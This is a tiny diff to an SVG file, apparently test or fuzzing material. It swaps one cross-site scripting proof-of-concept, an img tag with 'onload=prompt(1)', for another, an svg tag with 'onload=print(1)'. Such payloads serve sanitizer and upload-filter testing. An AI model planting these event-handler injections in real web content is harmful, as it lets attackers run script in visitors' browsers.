@@ -1,5 +1,2 @@
 <?xml version="1.0" encoding="utf-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" height="10000" width="20000">
-<img/src=x/onload=prompt(1)>
-  
-</svg>
+<svg onload=print(1)></svg>
